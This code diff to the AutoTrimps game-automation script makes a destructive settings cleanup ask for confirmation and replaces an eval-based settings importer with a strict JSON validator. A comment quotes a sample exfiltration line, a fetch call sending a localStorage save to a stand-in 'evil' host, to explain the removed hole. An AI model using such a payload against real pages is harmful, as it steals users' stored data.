@@ -164,6 +164,13 @@ export function onDeleteProfile() {
     debug("Successfully deleted profile #: " + target, "profile");
 }
 
+// The cleanup preview prints keys that came out of the user's localStorage into an innerHTML string.
+// They are stale setting ids, but they are attacker-influenceable in principle (a bad settings-file
+// import writes them), so they are escaped rather than trusted.
+function escapeHtml(s: string): string {
+    return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
+
 export function ImportExportTooltip(what: any, event?: any) {
     if (game.global.lockTooltip)
         return;
@@ -250,9 +257,21 @@ export function ImportExportTooltip(what: any, event?: any) {
             byId('importBox').focus();
         };
     } else if (what == "CleanupAutoTrimps") {
-        cleanupAutoTrimps();
-        tooltipText = "Autotrimps saved-settings have been attempted to be cleaned up. If anything broke, refreshing will fix it, but check that your settings are correct! (prestige in particular)";
-        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip();'>OK</div></div>";
+        // #76(A): this branch USED TO CALL cleanupAutoTrimps() right here — the settings file was
+        // destroyed by merely LOOKING at the tooltip, before the user could confirm anything, and the
+        // copy then told them to refresh, which is the step that made the loss permanent. Now the
+        // render is pure (cleanupCandidates()) and the delete needs an explicit click that names the
+        // count. Key names come from the user's localStorage, so they are escaped before innerHTML.
+        var stale = cleanupCandidates();
+        if (stale.length === 0) {
+            titleText = "Cleanup Saved Settings";
+            tooltipText = "Nothing to clean up — every key in your saved settings file is a setting this version of AutoTrimps still defines.";
+            costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip();'>OK</div></div>";
+        } else {
+            titleText = "<b>WARNING:</b> Delete " + stale.length + " saved setting(s)?";
+            tooltipText = "These <b>" + stale.length + "</b> key(s) in your saved settings file are not defined by this version of AutoTrimps (leftovers from an older version). Deleting them is <b>permanent</b> and cannot be undone.<br/><br/><textarea readonly style='width: 100%' rows='5'>" + escapeHtml(stale.join('\n')) + "</textarea><br/>Your " + (Object.keys(autoTrimpSettings).length - stale.length) + " live settings are NOT touched.";
+            costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-danger' onclick='cancelTooltip(); cleanupAutoTrimps(); saveSettings();'>Delete " + stale.length + "</div><div style='margin-left: 15%' class='btn btn-info' onclick='cancelTooltip();'>Cancel</div></div>";
+        }
     } else if (what == "ExportModuleVars") {
         tooltipText = "These are your custom Variables. The defaults have not been included, only what you have set... <br/><br/><textarea id='exportArea' style='width: 100%' rows='5'>" + exportModuleVars() + "</textarea>";
         costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip()'>Got it</div>";
@@ -900,7 +919,51 @@ export function ImportExportTooltip(what: any, event?: any) {
 export function resetAutoTrimps(a?: any,b?: any){ATrunning=!1,setTimeout((function(d: any){localStorage.removeItem("autoTrimpSettings"),autoTrimpSettings=d?d:{};var e=document.getElementById("settingsRow")!;e.removeChild(document.getElementById("autoSettings")!),e.removeChild(document.getElementById("autoTrimpsTabBarMenu")!),automationMenuSettingsInit(),initializeAllTabs(),initializeAllSettings(),initializeSettingsProfiles(),updateCustomButtons(),saveSettings(),checkPortalSettings(),ATrunning=!0} as any)(a),101),a?(debug("Successfully imported new AT settings...","profile"),b?ImportExportTooltip("message","Successfully Imported Autotrimps Settings File!: "+b):ImportExportTooltip("NameSettingsProfiles")):(debug("Successfully reset AT settings to Defaults...","profile"),ImportExportTooltip("message","Autotrimps has been successfully reset to its defaults!"))}
 // oxlint-disable-next-line no-unused-expressions -- faithful legacy port: comma sequence — de-comma behind the live net (#92)
 export function loadAutoTrimps(){try{var a=byId("importBox").value.replace(/[\n\r]/gm,""),b=JSON.parse(a);if(null==b)return void debug("Error importing AT settings, the string is empty.","profile")}catch(c: any){return void debug("Error importing AT settings, the string is bad."+c.message,"profile")}debug("Importing new AT settings file...","profile"),resetAutoTrimps(b)}
-export function cleanupAutoTrimps(){for(var a in autoTrimpSettings){var b=document.getElementById(autoTrimpSettings[a].id);null==b&&delete autoTrimpSettings[a]}}
+// #76(A) — WAS:
+//     for (var a in autoTrimpSettings) { var b = document.getElementById(autoTrimpSettings[a].id);
+//                                        null == b && delete autoTrimpSettings[a] }
+// i.e. "no DOM node right now" ⇒ "not a setting" ⇒ DELETE. Two things are wrong with that, and the
+// second one destroys the whole file:
+//
+//  1. The DOM is the wrong oracle. A control that is hidden, or whose tab has not been built, or
+//     that is mid-boot, has no node — and none of that makes it a dead setting. The question the
+//     purge actually wants to ask is "does THIS BUILD still declare this id?", which is now answered
+//     by settings-engine's definedSettingIds census, not by a DOM lookup.
+//  2. autoTrimpSettings holds keys that are NOT setting records. `ATversion` is a bare string
+//     (settings-engine.ts writes `autoTrimpSettings["ATversion"] = ATversion`), so `.id` is
+//     undefined, `getElementById(undefined)` is null, and it was deleted on every run. It is the key
+//     `loadPageVariables()` (utils.ts) gates the entire saved file on — so one click of the Cleanup
+//     button, then any saveSettings(), then a refresh, and ALL ~548 settings are silently back to
+//     defaults with no undo. Reproduced end-to-end on a fully-booted game+AT jsdom boot: of 548
+//     keys, `ATversion` was the ONE key with no DOM node, and it was the one that got deleted.
+//
+// The purge itself is LOAD-BEARING and stays (see #68): loadPageVariables() restores the whole
+// localStorage blob and serializeSettings() round-trips unknown keys forever, so this is the only
+// thing that ever removes a stale id — and a stale id is not inert, it RESURRECTS if that id is ever
+// re-minted. So: keep the purge, fix its predicate, and stop firing it without consent
+// (ImportExportTooltip now previews the candidate list and only deletes on an explicit confirm).
+const NON_SETTING_KEYS = new Set(['ATversion']);
+
+// Pure: what cleanupAutoTrimps() WOULD delete. No mutation — the tooltip renders this.
+export function cleanupCandidates(): string[] {
+    // Anti-footgun: an empty census means the settings UI never booted, NOT that no setting exists.
+    // Purging against an empty census would delete every key in the file.
+    if (definedSettingIds.size === 0) return [];
+    var stale: string[] = [];
+    for (var key in autoTrimpSettings) {
+        if (!Object.prototype.hasOwnProperty.call(autoTrimpSettings, key)) continue;
+        if (NON_SETTING_KEYS.has(key)) continue;   // bare values, not settings — never purge
+        if (definedSettingIds.has(key)) continue;  // this build still declares it — it is live
+        stale.push(key);
+    }
+    return stale;
+}
+
+export function cleanupAutoTrimps(): string[] {
+    var stale = cleanupCandidates();
+    for (var i = 0; i < stale.length; i++) delete autoTrimpSettings[stale[i]];
+    return stale;
+}
 export function exportModuleVars(){return JSON.stringify(compareModuleVars())}
 
 export function compareModuleVars() {
@@ -923,8 +986,95 @@ export function compareModuleVars() {
     return diffs;
 }
 
-// oxlint-disable-next-line no-unused-expressions,no-eval -- faithful legacy port: comma sequence — de-comma behind the live net (#92); settings import evals pasted text — tracked as #76
-export function importModuleVars(){try{var thestring=byId('importBox').value,strarr=thestring.split(/\n/);for(var line in strarr){var s=strarr[line];s=s.substring(0,s.indexOf(';')+1),s=s.replace(/\s/g,''),eval(s),strarr[line]=s}var tmpset=compareModuleVars()}catch(a: any){return void debug('Error importing MODULE vars, the string is bad.'+a.message,'profile')}localStorage.removeItem('storedMODULES'),safeSetItems('storedMODULES',JSON.stringify(tmpset))}
+// #76(B) — WAS: split the import textarea on newlines, truncate each line at its first `;`, strip
+// whitespace, and hand it to the dynamic-code sink. That is arbitrary code execution in page context
+// (`@grant none`) on anything the user pastes — `fetch('https://evil/'+localStorage.trimpSave1);` is
+// a valid "settings string". Reproduced on a real game+AT jsdom boot: pasting `window.__PWNED__=1;`
+// set it.
+//
+// It was ALSO a total no-op on the exporter's own output, and had been since 2016 (genBTC `3c4837f0`
+// switched exportModuleVars to JSON and left the assignment-line importer behind): exportModuleVars()
+// emits `JSON.stringify(compareModuleVars())` — one line, `{"mod":{"key":val}}`, with no `;` in it at
+// all. `indexOf(';')` is -1 ⇒ `substring(0, 0)` ⇒ the empty string ⇒ nothing applied. So export →
+// import round-tripped NOTHING. There is no legacy `MODULES.x.y=1;` string to stay compatible with
+// either: the format has been JSON for the entire life of the exporter.
+//
+// So we PARSE the exporter's grammar instead of executing the paste, and accept EXACTLY it:
+//   • top level: a JSON object of known module names (own key of both MODULES and MODULESdefault)
+//   • per module: an object of field names this build declared at boot (own key of MODULESdefault[mod])
+//   • per field: a JSON literal (null / finite number / boolean / string / arrays / plain objects of
+//     those — no functions, no NaN/Infinity, no prototype keys) whose SHAPE matches that field's
+//     default (same typeof, same array-ness). A `null` default accepts any literal, because that is
+//     the "unset" default (jobs.customRatio et al) whose real value the user is importing.
+// Validation is total and happens BEFORE any write: one bad entry rejects the whole paste (the old
+// sink could half-apply), reported through the existing debug() channel rather than thrown.
+//
+// storedMODULES (⚠️ #71): still removed-then-rewritten from compareModuleVars() — do not regress
+// this back to reading a `storedMODULES` identifier, which nothing assigns (ReferenceError).
+const PROTO_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
+
+function isPlainObject(v: any): boolean {
+    return v !== null && typeof v === 'object' && !Array.isArray(v) && (Object.getPrototypeOf(v) === Object.prototype || Object.getPrototypeOf(v) === null);
+}
+
+function isJsonLiteral(v: any): boolean {
+    if (v === null) return true;
+    var t = typeof v;
+    if (t === 'boolean' || t === 'string') return true;
+    if (t === 'number') return Number.isFinite(v);
+    if (Array.isArray(v)) return v.every(isJsonLiteral);
+    if (isPlainObject(v)) return Object.keys(v).every((k) => !PROTO_KEYS.has(k) && isJsonLiteral(v[k]));
+    return false;
+}
+
+function shapeMatchesDefault(value: any, dflt: any): boolean {
+    if (dflt === null) return true;                       // "unset" default — any literal is a valid set
+    if (value === null) return false;
+    if (Array.isArray(dflt) !== Array.isArray(value)) return false;
+    return typeof dflt === typeof value;
+}
+
+// Exported for the net: the pure validator. Returns the flat [module, field, value] writes an
+// import would perform, or throws an Error naming the first violation (caller turns it into debug()).
+export function parseModuleVars(text: string): [string, string, any][] {
+    var incoming = JSON.parse(text);  // throws SyntaxError on malformed input
+    if (!isPlainObject(incoming)) throw new Error('expected a JSON object of modules.');
+    var writes: [string, string, any][] = [];
+    var mods = Object.keys(incoming);
+    for (var i = 0; i < mods.length; i++) {
+        var mod = mods[i];
+        if (PROTO_KEYS.has(mod)) throw new Error('illegal module name: ' + mod);
+        if (!Object.prototype.hasOwnProperty.call(MODULES, mod) || !Object.prototype.hasOwnProperty.call(MODULESdefault, mod))
+            throw new Error('unknown module: ' + mod);
+        var fields = incoming[mod];
+        if (!isPlainObject(fields)) throw new Error('module ' + mod + ' is not an object of variables.');
+        var keys = Object.keys(fields);
+        for (var j = 0; j < keys.length; j++) {
+            var key = keys[j];
+            if (PROTO_KEYS.has(key)) throw new Error('illegal variable name: ' + mod + '.' + key);
+            if (!Object.prototype.hasOwnProperty.call(MODULESdefault[mod], key))
+                throw new Error('unknown variable: ' + mod + '.' + key);
+            var value = fields[key];
+            if (!isJsonLiteral(value)) throw new Error('unsupported value for ' + mod + '.' + key);
+            if (!shapeMatchesDefault(value, MODULESdefault[mod][key]))
+                throw new Error('wrong type for ' + mod + '.' + key + ' (expected ' + (Array.isArray(MODULESdefault[mod][key]) ? 'array' : typeof MODULESdefault[mod][key]) + ').');
+            writes.push([mod, key, value]);
+        }
+    }
+    return writes;
+}
+
+export function importModuleVars() {
+    var writes: [string, string, any][];
+    try {
+        writes = parseModuleVars(byId<HTMLTextAreaElement>('importBox').value);
+    } catch (a: any) {
+        return void debug('Error importing MODULE vars, the string is bad.' + a.message, 'profile');
+    }
+    for (var i = 0; i < writes.length; i++) MODULES[writes[i][0]][writes[i][1]] = writes[i][2];
+    localStorage.removeItem('storedMODULES');
+    safeSetItems('storedMODULES', JSON.stringify(compareModuleVars()));
+}
 // #71a — this function had TWO defects, both fatal, both invisible to tsc.
 //
 // 1. `JSON.stringify(storedMODULES)` read a name NOTHING in the shipped bundle ever assigns. That is a
